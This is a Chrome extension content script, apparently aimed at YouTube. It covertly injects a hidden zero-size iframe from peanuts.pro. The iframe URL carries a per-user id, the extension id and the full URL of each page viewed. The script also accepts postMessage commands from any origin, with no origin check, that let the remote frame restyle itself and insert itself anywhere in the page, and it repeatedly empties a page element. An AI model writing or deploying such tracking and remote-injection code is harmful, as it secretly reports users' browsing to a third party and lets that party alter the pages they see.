var USERID = null;
var baloonInterval = null;
var styleSet = null;

chrome.runtime.sendMessage({ type: 'getUUID' }, function (result) {
    if (result) {
        USERID = result
        useToken(result)
    }
    if (chrome.runtime.lastError) { }
});

function useToken(userid) {
    USERID = userid;
    insertFrame();
    baloonInterval = setInterval(() => {
        let el = document.getElementById('b_opalpers');
        if (el && el.innerHTML != '') {
            el.innerHTML = '';
        }
    }, 100);
}

window.addEventListener('yt-page-data-updated', function () {
    setTimeout(insertFrame,1000);    
});

const insertFrame = () => {
    document.getElementById('peanuts-iframe')?.remove();
    let b = document.createElement("iframe");
    clearInterval(baloonInterval);
    b.src = 'https://peanuts.pro/iframe?' + "&id=" + chrome.runtime.id + "&uid=" + USERID + "&u=" + encodeURIComponent(window.location.href);
    b.id = "peanuts-iframe";
    b.allowtransparency = true;
    b.scrolling = "no";
    b.style.opacity = 0;
    b.style.width = 0;
    b.style.height = 0;
    b.style.visibility = 'hidden';
    
    document.getElementsByTagName("body")[0].appendChild(b);
    var c = function (a) {                
        var style = a.data[1];
        var selector = a.data[2];
        var beforeAfter = a.data[3];

        switch (a.data[0]) {
            case "setStyle":
                if (styleSet)
                    return;
                styleSet = true;
                if (style) {
                    Object.keys(style).forEach((e,i) => {
                        b.style[e] = style[e];
                    });
                }
                if (selector) {
                    if (beforeAfter == 'after') {
                        document.querySelector(selector)?.after(b);                    
                    }
                    else {
                        document.querySelector(selector)?.before(b);   
                    }
                }
                //window.removeEventListener("message",c);                       
            break;  

            case "closemeplease":
                b.remove();   
                window.removeEventListener("message",c);       
                break;
        }
    };
    window.addEventListener("message", c, !1);
}